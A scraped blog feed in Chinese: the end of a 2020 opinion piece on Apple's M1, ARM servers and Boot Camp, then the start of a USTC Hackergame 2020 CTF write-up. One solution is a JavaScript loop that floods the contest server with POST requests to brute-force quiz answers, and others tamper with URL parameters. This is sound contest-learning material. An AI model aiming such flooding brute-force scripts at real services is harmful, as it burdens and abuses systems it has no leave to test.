ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 